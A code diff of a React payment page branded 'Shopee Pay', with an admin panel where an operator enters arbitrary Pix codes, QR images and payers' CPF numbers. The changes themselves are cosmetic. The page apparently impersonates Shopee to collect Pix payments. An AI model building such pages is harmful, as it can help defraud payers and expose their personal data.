@@ -39,9 +39,7 @@ const EyeOffIcon = () => (
   <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
   </svg>
-);
-
-const ShopeePixPayment = () => {
+);const ShopeePixPayment = () => {
   const [isAdmin, setIsAdmin] = useState(false);
   const [showLogin, setShowLogin] = useState(false);
   const [loginData, setLoginData] = useState({ username: '', password: '' });
@@ -180,8 +178,7 @@ const ShopeePixPayment = () => {
     if (!cpf) return '';
     const numbers = cpf.replace(/\D/g, '');
     return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-  };// CONTINUAÇÃO DO ShopeePixPayment - TELA DE LOGIN
-  
+  };// TELA DE LOGIN
   if (showLogin && !isAdmin) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-orange-100 via-red-50 to-orange-50 flex items-center justify-center p-4">
@@ -253,17 +250,25 @@ const ShopeePixPayment = () => {
 
   if (isAdmin) {
     return <AdminPanel onLogout={handleLogout} authToken={authToken} loadPayments={loadPayments} />;
-  }// CONTINUAÇÃO - TELA DO CLIENTE (PAGAMENTO)
-  
+  }// TELA DO CLIENTE (PAGAMENTO) - COM HEADER CORRIGIDO
   return (
     <div className="min-h-screen bg-gray-100">
       <div className="bg-gradient-to-r from-orange-500 via-orange-600 to-red-500 shadow-lg">
         <div className="max-w-2xl mx-auto px-4 py-4">
           <div className="flex items-center gap-3">
-            <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-red-500 rounded-xl flex items-center justify-center shadow-lg">
-              <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M7 2v2H4v2h1.5l1.5 13c0 1.1.9 2 2 2h6c1.1 0 2-.9 2-2l1.5-13H20V4h-3V2h-4v2H7zm2 2h6v2H9V4z"/>
-              </svg>
+            <div className="w-12 h-12 rounded-xl shadow-lg overflow-hidden bg-white flex items-center justify-center">
+              <img 
+                src="shopee-logo.png" 
+                alt="Shopee Logo" 
+                className="w-10 h-10 object-contain"
+                onError={(e) => {
+                  e.target.style.display = 'none';
+                  const fallback = document.createElement('div');
+                  fallback.className = 'w-10 h-10 bg-orange-500 rounded flex items-center justify-center text-white font-bold text-lg';
+                  fallback.textContent = 'S';
+                  e.target.parentNode.appendChild(fallback);
+                }}
+              />
             </div>
             <div>
               <h1 className="text-2xl font-bold text-white tracking-tight">Shopee Pay</h1>
@@ -298,11 +303,9 @@ const ShopeePixPayment = () => {
                 <p className="text-xs text-gray-600 mb-1">Produto</p>
                 <p className="text-sm font-semibold text-gray-800">{currentPayment.nomeProduto}</p>
               </div>
-            )}
-
-            <div className="mb-5">
+            )}<div className="mb-5">
               <div className="flex items-center gap-2 mb-3">
-                <img src="/pix-logo.png" alt="Pix" className="w-8 h-8 object-contain" onError={(e) => {
+                <img src="pix-logo.png" alt="Pix" className="w-8 h-8 object-contain" onError={(e) => {
                   e.target.style.display = 'none';
                   e.target.nextSibling.style.display = 'inline-block';
                 }} />
@@ -345,8 +348,7 @@ const ShopeePixPayment = () => {
               >
                 {copied ? (<><CheckIcon />Código Copiado!</>) : (<><CopyIcon />Copiar Código Pix</>)}
               </button>
-            </div>
-            <div className="bg-gray-50 rounded-lg p-4 mb-4">
+            </div><div className="bg-gray-50 rounded-lg p-4 mb-4">
               <p className="font-semibold text-gray-800 text-sm mb-3">Por favor, siga as instruções:</p>
               <div className="space-y-2.5">
                 <div className="flex gap-2 items-start">
@@ -499,8 +501,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
     if (value.length <= 11) {
       setFormData({...formData, cpfPagador: value});
     }
-  };// CONTINUAÇÃO ADMINPANEL - RENDER HTML
-  
+  };// ADMIN PANEL - RENDER HTML
   return (
     <div className="min-h-screen bg-gradient-to-br from-orange-50 to-red-50">
       <div className="bg-gradient-to-r from-orange-500 to-red-500 text-white p-4 shadow-lg">
@@ -548,8 +549,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                 <div className="md:col-span-2">
                   <label className="block text-sm font-semibold text-gray-700 mb-2">Código Pix (Copia e Cola) *</label>
                   <textarea value={formData.pixCode} onChange={(e) => setFormData({...formData, pixCode: e.target.value})} className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-500 focus:outline-none h-28 font-mono text-sm" placeholder="00020126330014br.gov.bcb.pix..." />
-                </div>
-                <div className="md:col-span-2">
+                </div><div className="md:col-span-2">
                   <label className="block text-sm font-semibold text-gray-700 mb-2">Imagem do QR Code (opcional)</label>
                   <div className="border-2 border-dashed border-orange-300 rounded-lg p-6 hover:border-orange-500 transition bg-white">
                     <input type="file" accept="image/*" onChange={handleImageUpload} className="hidden" id="qr-upload" />
@@ -584,8 +584,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                 </button>
               </div>
             </div>
-          )}
-          <div className="space-y-3">
+          )}<div className="space-y-3">
             {payments.length === 0 ? (
               <div className="text-center py-12">
                 <div className="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
@@ -608,7 +607,7 @@ const AdminPanel = ({ onLogout, authToken, loadPayments }) => {
                       {(payment.nomePagador || payment.cpfPagador) && (
                         <div className="mt-2 text-xs text-gray-500">
                           {payment.nomePagador && <p>👤 {payment.nomePagador}</p>}
-                          {payment.cpfPagador && <p>📄 {formatCPF(payment.cpfPagador)}</p>}
+                          {payment.cpfPagador && <p>🆔 {formatCPF(payment.cpfPagador)}</p>}
                         </div>
                       )}
                       <p className="text-xs text-gray-500 mt-2 font-mono bg-gray-50 px-2 py-1 rounded">{payment.pixCode.substring(0, 35)}...</p>
